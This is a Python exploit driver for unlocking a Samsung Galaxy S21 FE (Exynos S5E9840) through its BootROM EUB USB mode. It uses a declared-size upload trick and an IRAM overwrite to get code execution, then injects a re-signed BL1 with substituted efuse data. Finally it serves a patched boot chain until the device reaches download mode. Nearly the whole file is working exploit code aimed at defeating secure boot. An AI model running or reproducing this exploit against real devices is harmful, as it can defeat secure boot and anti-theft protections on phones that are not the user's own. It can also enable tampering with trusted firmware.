#!/usr/bin/env python3
"""EUB session driver v3 (final) for the S21 FE (S5E9840) unlock flow.

Everything learned from the failed sessions, baked in:

  1. Exploit: send bl1 (payload embedded at +0x2000, our efuse at +0x130,
     re-signed so the inner checksum/st1 signature COVER the payload) via
     houston's send_payload (+512 declared-size trick), then
     overwrite_iram (exec 0x02024000).

  2. Complete the deliberately-incomplete upload with 512 padding bytes on
     ep 0x2 — the blocking payload receive(300) picks them up and the
     payload then loads BL1 "normally" (header/checksum/verify/check all
     consistent with our keys), resets the USB/DNW state and continues
     into the BootROM load path.

  3. BL1 then requests the chain images on 0x81 as
     'eub:req:<socid>:<name>' (acks and requests can arrive in one read;
     the USB re-enumerates between stages). Parse requests properly,
     never stop on acks/duplicates, re-find+re-claim (with CDC setup —
     requests only flow after DTR) whenever the handle goes stale.

  4. After the full chain is served, the patched chain boots into
     download mode — watch for the state change.
"""

import re
import sys
import time

sys.path.insert(0, "houston")

import usb.core
import usb.util

from modules.eub import load_file, write_header, calculate_checksum
from modules.exploit import send_payload, overwrite_iram
from modules.usb_helper import read_bytes

SOC = {"rx_address": 0x02024000, "usb_struct_offset": 0x0480}

FILES = {
    "bl1": "output/sboot/bl1.bin",
    "epbl": "output/sboot/epbl.bin",
    "bl2": "output/sboot/bl2.bin",
    "bootload": "output/sboot/bootload.bin",
    "el3_mon": "output/sboot/el3_mon.bin",
    "ldfw": "output/ldfw/ldfw.bin",
    "tzsw": "output/tzsw/tzsw.bin",
}
CHAIN = ["epbl", "bl2", "bootload", "el3_mon", "ldfw", "tzsw"]

REQ_RE = re.compile(rb"eub:req:[0-9a-f]+:([a-z0-9_.]+)")


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def claim(dev, with_cdc=True):
    if dev.is_kernel_driver_active(0):
        dev.detach_kernel_driver(0)
    usb.util.claim_interface(dev, 0)
    if with_cdc and dev.idProduct == 0x1100:
        try:
            dev.ctrl_transfer(0x21, 0x20, 0, 0, bytes([0x00, 0xC2, 0x01, 0x00, 0x00, 0x00, 0x08]), timeout=2000)
            dev.ctrl_transfer(0x21, 0x22, 0x0003, 0, None, timeout=2000)
        except usb.core.USBError as e:
            log(f"    CDC setup skipped ({e})")


def find_and_claim(timeout_s=60, with_cdc=True, expect_pids=(0x1234, 0x1100)):
    dev = None
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        for pid in expect_pids:
            try:
                dev = usb.core.find(idVendor=0x04e8, idProduct=pid)
            except Exception:
                dev = None
            if dev is not None:
                try:
                    dev.get_active_configuration()
                    break
                except Exception:
                    dev = None
        if dev is not None:
            break
        time.sleep(0.5)
    if dev is None:
        return None
    claim(dev, with_cdc)
    return dev


def dnw_send(dev, name):
    path = FILES[name]
    file = load_file(path)
    size = len(file)
    write_header(file, size)
    calculate_checksum(file)
    ret = dev.write(2, file, timeout=5000)
    log(f"    -> sent {name} ({path}, {size} bytes): {'OK' if ret == size else 'SHORT WRITE'}")


def stale(dev):
    try:
        usb.util.release_interface(dev, 0)
    except Exception:
        pass
    try:
        usb.util.dispose_resources(dev)
    except Exception:
        pass


def complete_upload(dev):
    for size in (512, 300):
        try:
            ret = dev.write(2, b"\x00" * size, timeout=3000)
            log(f"    -> wrote {size} completion bytes: {ret} accepted")
            if ret == size:
                return True
        except usb.core.USBError as e:
            log(f"    -> {size} completion bytes failed: {e}")
    return False


def serve_chain(dev, served):
    """Serve chain requests; survive re-enumerations; never stop on acks."""
    deadline = time.time() + 600
    last_progress = time.time()
    while time.time() < deadline:
        if all(n in served for n in CHAIN):
            log("full chain served")
            return dev, "done"
        try:
            chunk = read_bytes(dev)
        except usb.core.USBError as e:
            log(f"read failed ({e}) — device likely re-enumerated; re-finding")
            stale(dev)
            dev = find_and_claim(timeout_s=30)
            if dev is None:
                return dev, "gone"
            log(f"re-claimed: bus {dev.bus} addr {dev.address}")
            continue
        if chunk:
            log(f"  <- {chunk!r}")
            for m in REQ_RE.finditer(chunk):
                name = m.group(1).decode().split(".")[0]
                if name in FILES:
                    if name not in served:
                        try:
                            dnw_send(dev, name)
                            served.add(name)
                            last_progress = time.time()
                        except usb.core.USBError as e:
                            log(f"send {name} failed: {e} — re-finding")
                            stale(dev)
                            dev = find_and_claim(timeout_s=30)
                            if dev is None:
                                return dev, "gone"
                    else:
                        log(f"    (already served: {name})")
                else:
                    log(f"    (unknown request name: {name})")
        elif time.time() - last_progress > 45:
            log(f"45s quiet; served so far: {sorted(served)}")
            last_progress = time.time()
    return dev, "timeout"


def watch_download_mode(seconds=120):
    seen = set()
    deadline = time.time() + seconds
    while time.time() < deadline:
        for pid in (0x685D, 0x1234, 0x1100):
            try:
                d = usb.core.find(idVendor=0x04e8, idProduct=pid)
            except Exception:
                d = None
            if d is not None:
                key = (d.bus, d.address, pid)
                if key not in seen:
                    seen.add(key)
                    log(f"    USB device present: 04e8:{pid:04x} bus {d.bus} addr {d.address}")
                    if pid == 0x685D:
                        log("download mode (Odin PID 04e8:685d) is up — session complete")
                        return True
        time.sleep(1)
    return False


def main():
    log("stage 1: waiting for EUB device (04e8:1100)")
    dev = find_and_claim(timeout_s=90, with_cdc=True)
    if dev is None:
        log("device not found")
        return
    log(f"device: {dev.idVendor:04x}:{dev.idProduct:04x} (bus {dev.bus} addr {dev.address})")

    log("stage 2: exploit (payload = bl1 with our efuse, checksum-covered)")
    send_payload(dev, FILES["bl1"])
    overwrite_iram(dev, False, SOC["rx_address"], SOC["usb_struct_offset"])
    log("exploit done (ACE) — payload blocking in its receive(300)")

    log("stage 3: completing the upload (512 padding bytes on ep 0x2, same handle)")
    if not complete_upload(dev):
        log("could not complete the upload — stop; needs a fresh EUB entry")
        return
    log("upload completion accepted")

    log("stage 4: serving chain requests (re-find on re-enumeration)")
    served = set()
    dev, result = serve_chain(dev, served)
    log(f"serve result: {result}; served: {sorted(served)}")

    log("stage 5: watching for chain boot / download-mode state")
    ok = watch_download_mode(120)
    if not ok:
        log("watch done — check lsusb for the download-mode device for the download-mode device")


if __name__ == "__main__":
    main()
